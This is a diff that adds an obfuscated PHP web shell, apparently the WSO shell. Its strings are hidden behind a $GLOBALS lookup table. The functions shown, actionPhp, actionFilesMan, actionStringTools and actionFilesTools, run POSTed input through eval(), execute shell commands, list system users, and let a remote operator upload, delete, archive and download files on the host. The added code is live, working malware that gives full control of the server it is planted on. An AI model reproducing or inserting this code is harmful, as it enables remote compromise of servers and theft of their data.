+            $danger = array($GLOBALS[ям][0x14e], $GLOBALS[ям][0x14f], $GLOBALS[ям][0x150], $GLOBALS[ям][0x151], $GLOBALS[ям][0x152], $GLOBALS[ям][0x153], $GLOBALS[ям][0x154], $GLOBALS[ям][0x155], $GLOBALS[ям][0x156], $GLOBALS[ям][0x157], $GLOBALS[ям][0x158], $GLOBALS[ям][0x159], $GLOBALS[ям][0x15a], $GLOBALS[ям][0x15b], $GLOBALS[ям][0x15c], $GLOBALS[ям][0x15d], $GLOBALS[ям][0x15e], $GLOBALS[ям][0x15f], $GLOBALS[ям][0x160], $GLOBALS[ям][0x161], $GLOBALS[ям][0x162], $GLOBALS[ям][0x163], $GLOBALS[ям][0x164], $GLOBALS[ям][0x165], $GLOBALS[ям][0x166], $GLOBALS[ям][0x167]);
+            $downloaders = array($GLOBALS[ям][0x168], $GLOBALS[ям][0x169], $GLOBALS[ям][0x16a], $GLOBALS[ям][0x16b], $GLOBALS[ям][0x16c], $GLOBALS[ям][0x16d], $GLOBALS[ям][0x16e]);
+            echo $GLOBALS[ям][0xdf];
+            $temp = array();
+            foreach ($userful as $item) {
+                if (wsoWhich($item)) {
+                    $temp[] = $item;
+                }
+            }
+            wsoSecParam($GLOBALS[ям][0x16f], implode($GLOBALS[ям][0x11d], $temp));
+            $temp = array();
+            foreach ($danger as $item) {
+                if (wsoWhich($item)) {
+                    $temp[] = $item;
+                }
+            }
+            wsoSecParam($GLOBALS[ям][0x170], implode($GLOBALS[ям][0x11d], $temp));
+            $temp = array();
+            foreach ($downloaders as $item) {
+                if (wsoWhich($item)) {
+                    $temp[] = $item;
+                }
+            }
+            wsoSecParam($GLOBALS[ям][0x171], implode($GLOBALS[ям][0x11d], $temp));
+            echo $GLOBALS[ям][0x172];
+            wsoSecParam($GLOBALS[ям][0x173], wsoEx($GLOBALS[ям][0x174]));
+            wsoSecParam($GLOBALS[ям][0x175], @file_get_contents($GLOBALS[ям][0x176]));
+            echo $GLOBALS[ям][0x177];
+            if (isset($_POST[$GLOBALS[ям][0x9d]], $_POST[$GLOBALS[ям][0x9f]]) && is_numeric($_POST[$GLOBALS[ям][0x9d]]) && is_numeric($_POST[$GLOBALS[ям][0x9f]])) {
+                $temp = $GLOBALS[ям][0x3d];
+                for (; $_POST[$GLOBALS[ям][0x9d]] <= $_POST[$GLOBALS[ям][0x9f]]; $_POST[$GLOBALS[ям][0x9d]]++) {
+                    $uid = @posix_getpwuid($_POST[$GLOBALS[ям][0x9d]]);
+                    if ($uid) {
+                        $temp .= join($GLOBALS[ям][0x178], $uid) . $GLOBALS[ям][0x9a];
+                    }
+                }
+                echo $GLOBALS[ям][0x172];
+                wsoSecParam($GLOBALS[ям][0x179], $temp);
+            }
+        }
+    } else {
+        wsoSecParam($GLOBALS[ям][0x17a], wsoEx($GLOBALS[ям][0x17b]));
+        wsoSecParam($GLOBALS[ям][0x17c], wsoEx($GLOBALS[ям][0x17d]));
+        wsoSecParam($GLOBALS[ям][0x17e], wsoEx($GLOBALS[ям][0x17f]));
+    }
+    echo $GLOBALS[ям][0x180];
+    wsoFooter();
+}
+function actionPhp()
+{
+    if (isset($_POST[$GLOBALS[ям][0x21]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], !0);
+        ob_start();
+        eval($_POST[$GLOBALS[ям][0x99]]);
+        $temp = $GLOBALS[ям][0x181] . addcslashes(htmlspecialchars(ob_get_clean()), $GLOBALS[ям][0x182]) . $GLOBALS[ям][0x183];
+        echo strlen($temp), $GLOBALS[ям][0x9a], $temp;
+        exit;
+    }
+    if (empty($_POST[$GLOBALS[ям][0x21]]) && !empty($_POST[$GLOBALS[ям][0x99]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], 0);
+    }
+    wsoHeader();
+    if (isset($_POST[$GLOBALS[ям][0x9d]]) && $_POST[$GLOBALS[ям][0x9d]] == $GLOBALS[ям][0x184]) {
+        echo $GLOBALS[ям][0x185];
+        ob_start();
+        phpinfo();
+        $tmp = ob_get_clean();
+        $tmp = preg_replace(array($GLOBALS[ям][0x186], $GLOBALS[ям][0x187], $GLOBALS[ям][0x188]), array($GLOBALS[ям][0x9b], $GLOBALS[ям][0x189], $GLOBALS[ям][0x9b]), $tmp);
+        echo str_replace($GLOBALS[ям][0x18a], $GLOBALS[ям][0x18b], $tmp) . $GLOBALS[ям][0x18c];
+    }
+    echo $GLOBALS[ям][0x18d] . (!empty($_POST[$GLOBALS[ям][0x99]]) ? htmlspecialchars($_POST[$GLOBALS[ям][0x99]]) : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x18e];
+    echo $GLOBALS[ям][0x18f] . ($_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21]] ? $GLOBALS[ям][0x190] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x191] . (empty($_POST[$GLOBALS[ям][0x99]]) ? $GLOBALS[ям][0x192] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x193];
+    if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        ob_start();
+        eval($_POST[$GLOBALS[ям][0x99]]);
+        echo htmlspecialchars(ob_get_clean());
+    }
+    echo $GLOBALS[ям][0x194];
+    wsoFooter();
+}
+function actionFilesMan()
+{
+    if (!empty($_COOKIE[$GLOBALS[ям][0x195]])) {
+        $_COOKIE[$GLOBALS[ям][0x195]] = @unserialize($_COOKIE[$GLOBALS[ям][0x195]]);
+    }
+    if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        switch ($_POST[$GLOBALS[ям][0x99]]) {
+            case $GLOBALS[ям][0x196]:
+                if (!@move_uploaded_file($_FILES[$GLOBALS[ям][0x195]][$GLOBALS[ям][0x197]], $_FILES[$GLOBALS[ям][0x195]][$GLOBALS[ям][0xa7]])) {
+                    echo $GLOBALS[ям][0x198];
+                }
+                break;
+            case $GLOBALS[ям][0x199]:
+                if (!@mkdir($_POST[$GLOBALS[ям][0x9d]])) {
+                    echo $GLOBALS[ям][0x19a];
+                }
+                break;
+            case $GLOBALS[ям][0x19b]:
+                function deleteDir($path)
+                {
+                    $path = substr($path, -1) == $GLOBALS[ям][0xd] ? $path : $path . $GLOBALS[ям][0xd];
+                    $dh = opendir($path);
+                    while (($item = readdir($dh)) !== !1) {
+                        $item = $path . $item;
+                        if (basename($item) == $GLOBALS[ям][0x19c] || basename($item) == $GLOBALS[ям][0x19d]) {
+                            continue;
+                        }
+                        $type = filetype($item);
+                        if ($type == $GLOBALS[ям][0x23]) {
+                            deleteDir($item);
+                        } else {
+                            @unlink($item);
+                        }
+                    }
+                    closedir($dh);
+                    @rmdir($path);
+                }
+                if (is_array(@$_POST[$GLOBALS[ям][0x195]])) {
+                    foreach ($_POST[$GLOBALS[ям][0x195]] as $f) {
+                        if ($f == $GLOBALS[ям][0x19e]) {
+                            continue;
+                        }
+                        $f = urldecode($f);
+                        if (is_dir($f)) {
+                            deleteDir($f);
+                        } else {
+                            @unlink($f);
+                        }
+                    }
+                }
+                break;
+            case $GLOBALS[ям][0x19f]:
+                if ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a1]) {
+                    function copy_paste($c, $s, $d)
+                    {
+                        if (is_dir($c . $s)) {
+                            mkdir($d . $s);
+                            $h = @opendir($c . $s);
+                            while (($f = @readdir($h)) !== !1) {
+                                if ($f != $GLOBALS[ям][0x19d] && $f != $GLOBALS[ям][0x19c]) {
+                                    copy_paste($c . $s . $GLOBALS[ям][0xd], $f, $d . $s . $GLOBALS[ям][0xd]);
+                                }
+                            }
+                        } elseif (is_file($c . $s)) {
+                            @copy($c . $s, $d . $s);
+                        }
+                    }
+                    foreach ($_COOKIE[$GLOBALS[ям][0x195]] as $f) {
+                        copy_paste($_COOKIE[$GLOBALS[ям][0x1d]], $f, $GLOBALS[$GLOBALS[ям][0x94]]);
+                    }
+                } elseif ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a2]) {
+                    function move_paste($c, $s, $d)
+                    {
+                        if (is_dir($c . $s)) {
+                            mkdir($d . $s);
+                            $h = @opendir($c . $s);
+                            while (($f = @readdir($h)) !== !1) {
+                                if ($f != $GLOBALS[ям][0x19d] && $f != $GLOBALS[ям][0x19c]) {
+                                    copy_paste($c . $s . $GLOBALS[ям][0xd], $f, $d . $s . $GLOBALS[ям][0xd]);
+                                }
+                            }
+                        } elseif (@is_file($c . $s)) {
+                            @copy($c . $s, $d . $s);
+                        }
+                    }
+                    foreach ($_COOKIE[$GLOBALS[ям][0x195]] as $f) {
+                        @rename($_COOKIE[$GLOBALS[ям][0x1d]] . $f, $GLOBALS[$GLOBALS[ям][0x94]] . $f);
+                    }
+                } elseif ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a3]) {
+                    if (class_exists($GLOBALS[ям][0x1a4])) {
+                        $zip = new ZipArchive();
+                        if ($zip->open($_POST[$GLOBALS[ям][0x9d]], 0x1)) {
+                            chdir($_COOKIE[$GLOBALS[ям][0x1d]]);
+                            foreach ($_COOKIE[$GLOBALS[ям][0x195]] as $f) {
+                                if ($f == $GLOBALS[ям][0x19e]) {
+                                    continue;
+                                }
+                                if (@is_file($_COOKIE[$GLOBALS[ям][0x1d]] . $f)) {
+                                    $zip->addFile($_COOKIE[$GLOBALS[ям][0x1d]] . $f, $f);
+                                } elseif (@is_dir($_COOKIE[$GLOBALS[ям][0x1d]] . $f)) {
+                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . $GLOBALS[ям][0xd], FilesystemIterator::SKIP_DOTS));
+                                    foreach ($iterator as $key => $value) {
+                                        $zip->addFile(realpath($key), $key);
+                                    }
+                                }
+                            }
+                            chdir($GLOBALS[$GLOBALS[ям][0x94]]);
+                            $zip->close();
+                        }
+                    }
+                } elseif ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a5]) {
+                    if (class_exists($GLOBALS[ям][0x1a4])) {
+                        $zip = new ZipArchive();
+                        foreach ($_COOKIE[$GLOBALS[ям][0x195]] as $f) {
+                            if ($zip->open($_COOKIE[$GLOBALS[ям][0x1d]] . $f)) {
+                                $zip->extractTo($GLOBALS[$GLOBALS[ям][0x94]]);
+                                $zip->close();
+                            }
+                        }
+                    }
+                } elseif ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x147]) {
+                    chdir($_COOKIE[$GLOBALS[ям][0x1d]]);
+                    $_COOKIE[$GLOBALS[ям][0x195]] = array_map($GLOBALS[ям][0x1a6], $_COOKIE[$GLOBALS[ям][0x195]]);
+                    wsoEx($GLOBALS[ям][0x1a7] . escapeshellarg($_POST[$GLOBALS[ям][0x9d]]) . $GLOBALS[ям][0xe3] . implode($GLOBALS[ям][0xe3], $_COOKIE[$GLOBALS[ям][0x195]]));
+                    chdir($GLOBALS[$GLOBALS[ям][0x94]]);
+                }
+                unset($_COOKIE[$GLOBALS[ям][0x195]]);
+                setcookie($GLOBALS[ям][0x195], $GLOBALS[ям][0x9b], time() - 0xe10);
+                break;
+            default:
+                if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+                    WSOsetcookie($GLOBALS[ям][0x1a0], $_POST[$GLOBALS[ям][0x99]]);
+                    WSOsetcookie($GLOBALS[ям][0x195], serialize(@$_POST[$GLOBALS[ям][0x195]]));
+                    WSOsetcookie($GLOBALS[ям][0x1d], @$_POST[$GLOBALS[ям][0x1d]]);
+                }
+                break;
+        }
+    }
+    wsoHeader();
+    echo $GLOBALS[ям][0x1a8];
+    $dirContent = wsoScandir(isset($_POST[$GLOBALS[ям][0x1d]]) ? $_POST[$GLOBALS[ям][0x1d]] : $GLOBALS[$GLOBALS[ям][0x94]]);
+    if ($dirContent === !1) {
+        echo $GLOBALS[ям][0x1a9];
+        wsoFooter();
+        return;
+    }
+    global $sort;
+    $sort = array($GLOBALS[ям][0xa7], 0x1);
+    if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        if (preg_match($GLOBALS[ям][0x1aa], $_POST[$GLOBALS[ям][0x99]], $match)) {
+            $sort = array($match[0x1], (int) $match[0x2]);
+        }
+    }
+    echo $GLOBALS[ям][0x1ab] . ($sort[0x1] ? 0 : 0x1) . $GLOBALS[ям][0x1ac] . ($sort[0x1] ? 0 : 0x1) . $GLOBALS[ям][0x1ad] . ($sort[0x1] ? 0 : 0x1) . $GLOBALS[ям][0x1ae] . ($sort[0x1] ? 0 : 0x1) . $GLOBALS[ям][0x1af];
+    $dirs = $files = array();
+    $n = count($dirContent);
+    for ($i = 0; $i < $n; $i++) {
+        if (function_exists($GLOBALS[ям][0xf5])) {
+            $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
+        } else {
+            $ow = $GLOBALS[ям][0x9b];
+        }
+        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
+        $tmp = array($GLOBALS[ям][0xa7] => $dirContent[$i], $GLOBALS[ям][0x1b0] => $GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i], $GLOBALS[ям][0x1b1] => date($GLOBALS[ям][0xde], @filemtime($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i])), $GLOBALS[ям][0x1b2] => wsoPermsColor($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i]), $GLOBALS[ям][0x1b3] => @filesize($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i]), $GLOBALS[ям][0x1b4] => $ow[$GLOBALS[ям][0xa7]] ? $ow[$GLOBALS[ям][0xa7]] : @fileowner($dirContent[$i]), $GLOBALS[ям][0x1b5] => $gr[$GLOBALS[ям][0xa7]] ? $gr[$GLOBALS[ям][0xa7]] : @filegroup($dirContent[$i]));
+        if (@is_file($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i])) {
+            $files[] = array_merge($tmp, array($GLOBALS[ям][0x1b6] => $GLOBALS[ям][0x1b7]));
+        } elseif (@is_link($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i])) {
+            $dirs[] = array_merge($tmp, array($GLOBALS[ям][0x1b6] => $GLOBALS[ям][0x1b8], $GLOBALS[ям][0x1b8] => readlink($tmp[$GLOBALS[ям][0x1b0]])));
+        } elseif (@is_dir($GLOBALS[$GLOBALS[ям][0x94]] . $dirContent[$i])) {
+            $dirs[] = array_merge($tmp, array($GLOBALS[ям][0x1b6] => $GLOBALS[ям][0x1b9]));
+        }
+    }
+    $GLOBALS[$GLOBALS[ям][0x1ba]] = $sort;
+    function wsoCmp($a, $b)
+    {
+        if ($GLOBALS[$GLOBALS[ям][0x1ba]][0] != $GLOBALS[ям][0x1b3]) {
+            return strcmp(strtolower($a[$GLOBALS[$GLOBALS[ям][0x1ba]][0]]), strtolower($b[$GLOBALS[$GLOBALS[ям][0x1ba]][0]])) * ($GLOBALS[$GLOBALS[ям][0x1ba]][0x1] ? 0x1 : -1);
+        } else {
+            return ($a[$GLOBALS[ям][0x1b3]] < $b[$GLOBALS[ям][0x1b3]] ? -1 : 0x1) * ($GLOBALS[$GLOBALS[ям][0x1ba]][0x1] ? 0x1 : -1);
+        }
+    }
+    usort($files, $GLOBALS[ям][0x1bb]);
+    usort($dirs, $GLOBALS[ям][0x1bb]);
+    $files = array_merge($dirs, $files);
+    $l = 0;
+    foreach ($files as $f) {
+        echo $GLOBALS[ям][0x1bc] . ($l ? $GLOBALS[ям][0x1bd] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x1be] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1bf] . ($f[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x1b7] ? $GLOBALS[ям][0x1c0] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1c1] . htmlspecialchars($f[$GLOBALS[ям][0xa7]]) : $GLOBALS[ям][0x1c2] . $f[$GLOBALS[ям][0x1b0]] . $GLOBALS[ям][0x1c3] . (empty($f[$GLOBALS[ям][0x1b8]]) ? $GLOBALS[ям][0x9b] : "title='{$f[$GLOBALS[ям][0x1b8]]}'") . $GLOBALS[ям][0x1c4] . htmlspecialchars($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1c5]) . $GLOBALS[ям][0x1c6] . ($f[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x1b7] ? wsoViewSize($f[$GLOBALS[ям][0x1b3]]) : $f[$GLOBALS[ям][0x1b6]]) . $GLOBALS[ям][0x1c7] . $f[$GLOBALS[ям][0x1b1]] . $GLOBALS[ям][0x1c7] . $f[$GLOBALS[ям][0x1b4]] . $GLOBALS[ям][0xd] . $f[$GLOBALS[ям][0x1b5]] . $GLOBALS[ям][0x1c8] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1c9] . $f[$GLOBALS[ям][0x1b2]] . $GLOBALS[ям][0x1ca] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1cb] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1cc] . ($f[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x1b7] ? $GLOBALS[ям][0x1cd] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1ce] . urlencode($f[$GLOBALS[ям][0xa7]]) . $GLOBALS[ям][0x1cf] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x1d0];
+        $l = $l ? 0 : 0x1;
+    }
+    echo $GLOBALS[ям][0x1d1] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x1d2] . (isset($_POST[$GLOBALS[ям][0x90]]) ? $_POST[$GLOBALS[ям][0x90]] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x1d3];
+    if (class_exists($GLOBALS[ям][0x1a4])) {
+        echo $GLOBALS[ям][0x1d4];
+    }
+    echo $GLOBALS[ям][0x1d5];
+    if (function_exists($GLOBALS[ям][0x16]) && !empty($_COOKIE[$GLOBALS[ям][0x1a0]]) && @count($_COOKIE[$GLOBALS[ям][0x195]])) {
+        echo $GLOBALS[ям][0x1d6];
+    }
+    echo $GLOBALS[ям][0x1d7];
+    if (function_exists($GLOBALS[ям][0x16]) && !empty($_COOKIE[$GLOBALS[ям][0x1a0]]) && @count($_COOKIE[$GLOBALS[ям][0x195]]) && ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a3] || $_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x147])) {
+        echo $GLOBALS[ям][0x1d8] . date($GLOBALS[ям][0x1d9]) . $GLOBALS[ям][0x19d] . ($_COOKIE[$GLOBALS[ям][0x1a0]] == $GLOBALS[ям][0x1a3] ? $GLOBALS[ям][0x1a3] : $GLOBALS[ям][0x1da]) . $GLOBALS[ям][0x1db];
+    }
+    echo $GLOBALS[ям][0x1dc];
+    wsoFooter();
+}
+function actionStringTools()
+{
+    if (!function_exists($GLOBALS[ям][0x1dd])) {
+        function hex2bin($p)
+        {
+            return decbin(hexdec($p));
+        }
+    }
+    if (!function_exists($GLOBALS[ям][0x1de])) {
+        function binhex($p)
+        {
+            return dechex(bindec($p));
+        }
+    }
+    if (!function_exists($GLOBALS[ям][0x1df])) {
+        function hex2ascii($p)
+        {
+            $r = $GLOBALS[ям][0x9b];
+            for ($i = 0; $i < strLen($p); $i += 0x2) {
+                $r .= chr(hexdec($p[$i] . $p[$i + 0x1]));
+            }
+            return $r;
+        }
+    }
+    if (!function_exists($GLOBALS[ям][0x1e0])) {
+        function ascii2hex($p)
+        {
+            $r = $GLOBALS[ям][0x9b];
+            for ($i = 0; $i < strlen($p); ++$i) {
+                $r .= sprintf($GLOBALS[ям][0x1e1], ord($p[$i]));
+            }
+            return strtoupper($r);
+        }
+    }
+    if (!function_exists($GLOBALS[ям][0x1e2])) {
+        function full_urlencode($p)
+        {
+            $r = $GLOBALS[ям][0x9b];
+            for ($i = 0; $i < strlen($p); ++$i) {
+                $r .= $GLOBALS[ям][0x1e3] . dechex(ord($p[$i]));
+            }
+            return strtoupper($r);
+        }
+    }
+    $stringTools = array($GLOBALS[ям][0x1e4] => $GLOBALS[ям][0x1e5], $GLOBALS[ям][0x1e6] => $GLOBALS[ям][0x1e7], $GLOBALS[ям][0x1e8] => $GLOBALS[ям][0x1e9], $GLOBALS[ям][0x1ea] => $GLOBALS[ям][0x1eb], $GLOBALS[ям][0x1ec] => $GLOBALS[ям][0x1e2], $GLOBALS[ям][0x1ed] => $GLOBALS[ям][0x1ee], $GLOBALS[ям][0x1ef] => $GLOBALS[ям][0x1f0], $GLOBALS[ям][0x1f1] => $GLOBALS[ям][0x1f1], $GLOBALS[ям][0x1f2] => $GLOBALS[ям][0x1f3], $GLOBALS[ям][0x1f4] => $GLOBALS[ям][0x1e0], $GLOBALS[ям][0x1f5] => $GLOBALS[ям][0x1df], $GLOBALS[ям][0x1f6] => $GLOBALS[ям][0x1f7], $GLOBALS[ям][0x1f8] => $GLOBALS[ям][0x1dd], $GLOBALS[ям][0x1f9] => $GLOBALS[ям][0x1fa], $GLOBALS[ям][0x1fb] => $GLOBALS[ям][0x1fc], $GLOBALS[ям][0x1fd] => $GLOBALS[ям][0x1de], $GLOBALS[ям][0x1fe] => $GLOBALS[ям][0x1ff], $GLOBALS[ям][0x200] => $GLOBALS[ям][0x201], $GLOBALS[ям][0x202] => $GLOBALS[ям][0x203], $GLOBALS[ям][0x204] => $GLOBALS[ям][0x205], $GLOBALS[ям][0x206] => $GLOBALS[ям][0x207]);
+    if (isset($_POST[$GLOBALS[ям][0x21]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], !0);
+        ob_start();
+        if (in_array($_POST[$GLOBALS[ям][0x99]], $stringTools)) {
+            echo $_POST[$GLOBALS[ям][0x99]]($_POST[$GLOBALS[ям][0x9d]]);
+        }
+        $temp = $GLOBALS[ям][0x208] . addcslashes(htmlspecialchars(ob_get_clean()), $GLOBALS[ям][0x182]) . $GLOBALS[ям][0x183];
+        echo strlen($temp), $GLOBALS[ям][0x9a], $temp;
+        exit;
+    }
+    if (empty($_POST[$GLOBALS[ям][0x21]]) && !empty($_POST[$GLOBALS[ям][0x99]])) {
+        WSOsetcookie(md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21], 0);
+    }
+    wsoHeader();
+    echo $GLOBALS[ям][0x209];
+    echo $GLOBALS[ям][0x20a];
+    foreach ($stringTools as $k => $v) {
+        echo $GLOBALS[ям][0x20b] . htmlspecialchars($v) . $GLOBALS[ям][0x20c] . $k . $GLOBALS[ям][0x20d];
+    }
+    echo $GLOBALS[ям][0x20e] . (@$_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21]] ? $GLOBALS[ям][0x190] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x20f] . (empty($_POST[$GLOBALS[ям][0x99]]) ? $GLOBALS[ям][0x9b] : htmlspecialchars(@$_POST[$GLOBALS[ям][0x9d]])) . $GLOBALS[ям][0x210] . (empty($_POST[$GLOBALS[ям][0x99]]) ? $GLOBALS[ям][0x192] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0x211];
+    if (!empty($_POST[$GLOBALS[ям][0x99]])) {
+        if (in_array($_POST[$GLOBALS[ям][0x99]], $stringTools)) {
+            echo htmlspecialchars($_POST[$GLOBALS[ям][0x99]]($_POST[$GLOBALS[ям][0x9d]]));
+        }
+    }
+    echo $GLOBALS[ям][0x212] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x213];
+    function wsoRecursiveGlob($path)
+    {
+        if (substr($path, -1) != $GLOBALS[ям][0xd]) {
+            $path .= $GLOBALS[ям][0xd];
+        }
+        $paths = @array_unique(@array_merge(@glob($path . $_POST[$GLOBALS[ям][0x9f]]), @glob($path . $GLOBALS[ям][0x214], GLOB_ONLYDIR)));
+        if (is_array($paths) && @count($paths)) {
+            foreach ($paths as $item) {
+                if (@is_dir($item)) {
+                    if ($path != $item) {
+                        wsoRecursiveGlob($item);
+                    }
+                } else {
+                    if (empty($_POST[$GLOBALS[ям][0x9d]]) || @strpos(file_get_contents($item), $_POST[$GLOBALS[ям][0x9d]]) !== !1) {
+                        echo $GLOBALS[ям][0x215] . urlencode($item) . $GLOBALS[ям][0x216] . htmlspecialchars($item) . $GLOBALS[ям][0x217];
+                    }
+                }
+            }
+        }
+    }
+    if (@$_POST[$GLOBALS[ям][0x9f]]) {
+        wsoRecursiveGlob($_POST[$GLOBALS[ям][0x1d]]);
+    }
+    echo $GLOBALS[ям][0x218];
+    wsoFooter();
+}
+function actionFilesTools()
+{
+    if (isset($_POST[$GLOBALS[ям][0x99]])) {
+        $_POST[$GLOBALS[ям][0x99]] = urldecode($_POST[$GLOBALS[ям][0x99]]);
+    }
+    if (@$_POST[$GLOBALS[ям][0x9d]] == $GLOBALS[ям][0x219]) {
+        if (@is_file($_POST[$GLOBALS[ям][0x99]]) && @is_readable($_POST[$GLOBALS[ям][0x99]])) {
+            ob_start($GLOBALS[ям][0x21a], 0x1000);
+            header($GLOBALS[ям][0x21b] . basename($_POST[$GLOBALS[ям][0x99]]));
+            if (function_exists($GLOBALS[ям][0x21c])) {
+                $type = @mime_content_type($_POST[$GLOBALS[ям][0x99]]);
+                header($GLOBALS[ям][0x21d] . $type);
+            } else {
+                header($GLOBALS[ям][0x21e]);
+            }
+            $fp = @fopen($_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0xfc]);
+            if ($fp) {
+                while (!@feof($fp)) {
+                    echo @fread($fp, 0x400);
+                }
+                fclose($fp);
+            }
+        }
+        exit;
+    }
+    if (@$_POST[$GLOBALS[ям][0x9d]] == $GLOBALS[ям][0x21f]) {
+        if (!file_exists($_POST[$GLOBALS[ям][0x99]])) {
+            $fp = @fopen($_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0x109]);
+            if ($fp) {
+                $_POST[$GLOBALS[ям][0x9d]] = $GLOBALS[ям][0x220];
+                fclose($fp);
+            }
+        }
+    }
+    wsoHeader();
+    echo $GLOBALS[ям][0x221];
+    if (!file_exists(@$_POST[$GLOBALS[ям][0x99]])) {
+        echo $GLOBALS[ям][0x222];
+        wsoFooter();
+        return;
+    }
+    $uid = @posix_getpwuid(@fileowner($_POST[$GLOBALS[ям][0x99]]));
+    if (!$uid) {
+        $uid[$GLOBALS[ям][0xa7]] = @fileowner($_POST[$GLOBALS[ям][0x99]]);
+        $gid[$GLOBALS[ям][0xa7]] = @filegroup($_POST[$GLOBALS[ям][0x99]]);
+    } else {
+        $gid = @posix_getgrgid(@filegroup($_POST[$GLOBALS[ям][0x99]]));
+    }
+    echo $GLOBALS[ям][0x223] . htmlspecialchars(@basename($_POST[$GLOBALS[ям][0x99]])) . $GLOBALS[ям][0x224] . (is_file($_POST[$GLOBALS[ям][0x99]]) ? wsoViewSize(filesize($_POST[$GLOBALS[ям][0x99]])) : $GLOBALS[ям][0x104]) . $GLOBALS[ям][0x225] . wsoPermsColor($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x226] . $uid[$GLOBALS[ям][0xa7]] . $GLOBALS[ям][0xd] . $gid[$GLOBALS[ям][0xa7]] . $GLOBALS[ям][0xdf];
+    echo $GLOBALS[ям][0x227] . date($GLOBALS[ям][0xde], filectime($_POST[$GLOBALS[ям][0x99]])) . $GLOBALS[ям][0x228] . date($GLOBALS[ям][0xde], fileatime($_POST[$GLOBALS[ям][0x99]])) . $GLOBALS[ям][0x229] . date($GLOBALS[ям][0xde], filemtime($_POST[$GLOBALS[ям][0x99]])) . $GLOBALS[ям][0x22a];
+    if (empty($_POST[$GLOBALS[ям][0x9d]])) {
+        $_POST[$GLOBALS[ям][0x9d]] = $GLOBALS[ям][0x22b];
+    }
+    if (is_file($_POST[$GLOBALS[ям][0x99]])) {
+        $m = array($GLOBALS[ям][0x22c], $GLOBALS[ям][0x22d], $GLOBALS[ям][0x22e], $GLOBALS[ям][0x22f], $GLOBALS[ям][0x230], $GLOBALS[ям][0x231], $GLOBALS[ям][0x232], $GLOBALS[ям][0x233]);
+    } else {
+        $m = array($GLOBALS[ям][0x231], $GLOBALS[ям][0x232], $GLOBALS[ям][0x233]);
+    }
+    foreach ($m as $v) {
+        echo $GLOBALS[ям][0x234] . urlencode($_POST[$GLOBALS[ям][0x99]]) . $GLOBALS[ям][0x235] . strtolower($v) . $GLOBALS[ям][0x236] . (strtolower($v) == @$_POST[$GLOBALS[ям][0x9d]] ? $GLOBALS[ям][0x237] . $v . $GLOBALS[ям][0x1c5] : $v) . $GLOBALS[ям][0x238];
+    }
+    echo $GLOBALS[ям][0x22a];
+    switch ($_POST[$GLOBALS[ям][0x9d]]) {
+        case $GLOBALS[ям][0x22b]:
+            echo $GLOBALS[ям][0x117];
+            $fp = @fopen($_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0xa3]);
+            if ($fp) {
+                while (!@feof($fp)) {
+                    echo htmlspecialchars(@fread($fp, 0x400));
+                }
+                @fclose($fp);
+            }
+            echo $GLOBALS[ям][0x118];
+            break;
+        case $GLOBALS[ям][0x239]:
+            if (@is_readable($_POST[$GLOBALS[ям][0x99]])) {
+                echo $GLOBALS[ям][0x23a];
+                $code = @highlight_file($_POST[$GLOBALS[ям][0x99]], !0);
